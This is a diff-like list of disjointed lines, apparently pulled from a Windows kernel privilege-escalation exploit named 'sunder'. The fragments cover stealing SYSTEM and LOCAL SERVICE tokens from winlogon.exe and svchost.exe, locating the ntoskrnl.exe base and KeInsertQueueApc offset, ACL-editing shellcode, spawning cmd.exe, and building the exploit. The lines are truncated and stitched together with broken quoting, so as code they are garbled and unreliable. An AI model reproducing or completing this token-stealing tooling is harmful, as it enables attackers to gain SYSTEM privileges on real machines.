@@ -1,0 +1,21 @@
+			// Steal LOCAL SERVICE token from svchost.exe
+		int i = 0; // Counter to skip each invalid svchost.exe
+	- *Note: Offsets for ACL editing have only been tested against winlogon.exe
+	// Find offset to KeInsertQueueApc in ntoskrnl.exe
+	// Obtain kernel-mode base address of ntoskrnl.exe
+"				systemToken = obtainTokenFromProcess(L""winlogon.exe"
+"			printf(""[!] Note the ACL offset is only confirmed valid for winlogon.exe"
+"			svcToken = obtainTokenFromProcess(L""svchost.exe"
+"		system(""start cmd.exe"
+"	// if targeting self, start cmd.exe"
+"	HMODULE umodeNtoskrnl = LoadLibraryA(""C:\\Windows\\System32\\ntoskrnl.exe"
+"	HMODULE umodeNtoskrnl = LoadLibraryW(L""C:\\Windows\\System32\\ntoskrnl.exe"
+"	ULONGLONG ntosBase = findKernelBase(""ntoskrnl.exe"
+"	if ((ntosbase = GetBaseAddr(L""ntoskrnl.exe"
+"	printf(""[*] Base address of ntoskrnl.exe"
+"	printf(""[*] Stealing target process token and starting cmd.exe"
+"	system(""start cmd.exe"
+"//			Especially with ACL editing shellcode, ACL offset is volatile and currently set for winlogon.exe"
+"Build the exploit in Visual Studio (x64, Release). Execute sunder.exe"
+*.exe
+- Token Stealing - Steal a token from any process (spawns cmd.exe
